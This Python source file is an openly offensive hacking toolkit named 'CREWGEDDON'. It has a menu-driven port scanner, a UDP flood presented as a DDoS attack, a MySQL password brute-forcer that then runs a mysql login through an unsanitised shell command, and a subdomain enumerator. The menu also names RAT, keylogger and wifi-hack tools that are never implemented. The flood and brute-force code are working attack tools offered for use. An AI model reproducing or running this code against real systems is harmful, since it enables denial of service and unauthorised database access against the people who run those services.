from colorama import Fore, Back, Style
import socket
import random
import os
import time
import pymysql
pymysql.install_as_MySQLdb()
import requests

os.system("cls")
os.system("clear")
print(Fore.RED + """
 ██████╗ ██████╗ ███████╗ ██╗    ██╗  ██████╗ ███████╗ ██████╗ ██████╗  ██████╗ ███╗  ██╗
██╔════╝ ██╔══██╗ ██╔════╝ ██║    ██║ ██╔════╝ ██╔════╝ ██╔══██╗ ██╔══██╗ ██╔═══██╗ ████╗  ██║
██║      ██████╔╝ █████╗   ██║ █╗ ██║ ██║  ███╗ █████╗   ██║  ██║ ██║  ██║ ██║   ██║ ██╔██╗ ██║
██║      ██╔══██╗ ██╔══╝   ██║███╗██║ ██║   ██║ ██╔══╝   ██║  ██║ ██║  ██║ ██║   ██║ ██║╚██╗██║
╚██████╗ ██║  ██║ ███████╗ ╚███╔███╔╝ ╚██████╔╝ ███████╗ ██████╔╝ ██████╔╝ ╚██████╔╝ ██║ ╚████║
 ╚═════╝ ╚═╝  ╚═╝ ╚══════╝  ╚══╝╚══╝   ╚═════╝  ╚══════╝ ╚═════╝  ╚═════╝   ╚═════╝  ╚═╝  ╚═══╝
      
Discord: crew.dev             GitHub: crewcik
""")
print(Fore.GREEN + "[1]" + Fore.BLUE + " - Open Port Search")
print(Fore.GREEN + "[2]" + Fore.BLUE + " - Web See IP")
print(Fore.GREEN + "[3]" + Fore.BLUE + " - Ddos Attack")
print(Fore.GREEN + "[4]" + Fore.BLUE + " - MySql Brute Force")
print(Fore.GREEN + "[5]" + Fore.BLUE + " - Sub Domain Scanner")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[6]" + Fore.BLUE + " - RAT Tools")
print(Fore.GREEN + "[7]" + Fore.BLUE + " - KeyLogger Tools")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[8]" + Fore.BLUE + " - Wifi Hack Tools (Monito@r Mode)")
print(Fore.GREEN + "[9]" + Fore.BLUE + " - Wifi Monitor Mode")
print(Fore.GREEN + "[10]" + Fore.BLUE + " - Wifi Managed Mode")
print(Fore.GREEN + "-------------------------")
print(Fore.GREEN + "[11]" + Fore.BLUE + " - Exit")
print(" ")
while True:
      select = input(Fore.CYAN + "CREWGEDDON~#: ")

      if select == "1":
          host = input(Fore.BLUE + "[CREWGEDDON]: Enter IP Address: ")
          ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306, 8080]
          for p in ports:
              with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                  s.settimeout(0.5)
                  if s.connect_ex((host, p)) == 0:
                      print(Fore.GREEN + f"[CREWGEDDON]-[{host}]: OPEN: {p}")
                  else:
                      print(Fore.RED + f"[CREWGEDDON]-[{host}]: CLOSED: {p}")
      elif select == "2":
            url = input(Fore.BLUE + "[CREWGEDDON]: Enter Website URL (crew.com): ")
            ip_address = socket.gethostbyname(url)
            if ip_address:
                  print(Fore.GREEN + f"[CREWGEDDON]: The IP address of {url} is {ip_address}")
            else:
                  print(Fore.RED + "[CREWGEDDON]: Could not retrieve IP address.")
      elif select == "3":
            print(Fore.RED + "[CREWGEDDON]: Welcome to the DDoS Attack") 
            print(Fore.GREEN + "[1]" + Fore.BLUE + " - Web Sites Attack")
            ddos_select = int(input(Fore.RED + "CREWGEDDON-DDOS~#: "))

            if ddos_select == 1:
                  ip = input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter IP Adress: ")
                  port = int(input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter Port: "))
                  crewsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                  counter = 0
                  crewrandom = random.randbytes(9999)
                  while True:
                       crewsock.sendto(crewrandom, (ip, port))
                       time.sleep(0.5)
                       print(Fore.RED + "[CREWGEDDON-DDOS]: " + Fore.GREEN + f"The attack is being successfully sent to {ip} (%{counter})")
                       counter = counter + 1
                       if counter >= 5000:
                            print(Fore.RED + "[CREWGEDDON-DDOS]: The attack stoped.")
                            break
      elif select == "4":
                  print(Fore.RED + "[CREWGEDDON]: Welcome to MySql Brute Force Tool")
                  host = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter MySql Host (localhost): ")
                  user = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter MySql User (root): ")
                  password_file = input(Fore.BLUE + "[CREWGEDDON-MySql]: Enter Password File Path (passwords.txt): ")
                  passwords = open(password_file, "r").readlines()
                  for password in passwords:
                      password = password.strip()
                      try:
                        db = pymysql.connect(host, user, password)
                        print(Fore.GREEN + f"[CREWGEDDON-MySql]: Success! Password found: {password}")
                        mysql_login = input(Fore.BLUE + "[CREWGEDDON-MySql]: Login MySql? (y/n): ")
                        
                        if mysql_login.lower() == "y":
                              os.system(f"mysql -u {user} -p {password} -h {host}")
                        elif mysql_login.lower() == "n":
                              break
                        else:
                              print(Fore.RED + "[CREWGEDDON-MySql]: Invalid option selected.")
                              break
                        
                      except pymysql.Error:
                          print(Fore.RED + f"[CREWGEDDON-MySql]: Failed attempt with password: {password}") 
      elif select == "5":
            domain = input(Fore.BLUE + "[CREWGEDDON]: Enter Domain (crew.com): ").strip()
            url = f"https://crt.sh/?q=%25.{domain}&output=json"

            try:
                resp = requests.get(url, timeout=30)
                resp.raise_for_status()
            except requests.RequestException as e:
                print(Fore.RED + f"[CREWGEDDON]: Request failed: {e}")
            try:
                data = resp.json()
            except ValueError:
                print(Fore.RED + "[CREWGEDDON]: Not return JSON")
            subs = set()

            for entry in data:
                name = entry.get("name_value")
                if not name:
                    continue
                for n in name.splitlines():
                    n = n.strip()
                    if n.endswith(domain):
                        subs.add(n)

            if not subs:
                print(Fore.YELLOW + "[CREWGEDDON-SubDomain]: No subdomains found.")
            else:
                print(Fore.BLUE + "[CREWGEDDON-SubDomain]: Subdomains found:")
                for sub in sorted(subs):
                    print(Fore.GREEN + f"[CREWGEDDON-SubDomain]: {sub}")

      elif select == "11":
            print(Fore.RED + "[CREWGEDDON]: Exiting...")
            os.system("exit")
            break
      else: 
            print(Fore.RED + "[CREWGEDDON]: Invalid option selected.")

# Developed By: Crew
